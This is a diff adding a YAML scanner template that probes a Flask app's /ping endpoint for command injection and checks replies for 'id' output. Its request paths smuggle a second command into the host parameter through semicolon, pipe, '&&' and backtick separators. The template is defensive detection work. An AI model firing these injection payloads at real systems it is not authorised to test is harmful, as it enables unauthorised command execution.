@@ -1,0 +1,30 @@
+id: flask-command-injection
+
+info:
+  name: Flask App - Command Injection in Ping
+  author: vulnremediate
+  severity: critical
+  description: Command Injection vulnerability in /ping endpoint
+  tags: rce,injection,flask,command-injection
+  reference:
+    - https://owasp.org/www-community/attacks/Command_Injection
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/ping?host=127.0.0.1;id"
+      - "{{BaseURL}}/ping?host=127.0.0.1%7Cid"
+      - "{{BaseURL}}/ping?host=127.0.0.1%26%26id"
+      - "{{BaseURL}}/ping?host=127.0.0.1`id`"
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "uid=[0-9]+.*gid=[0-9]+"
+          - "root|daemon|www-data"
+        condition: or
+
+      - type: status
+        status:
+          - 200
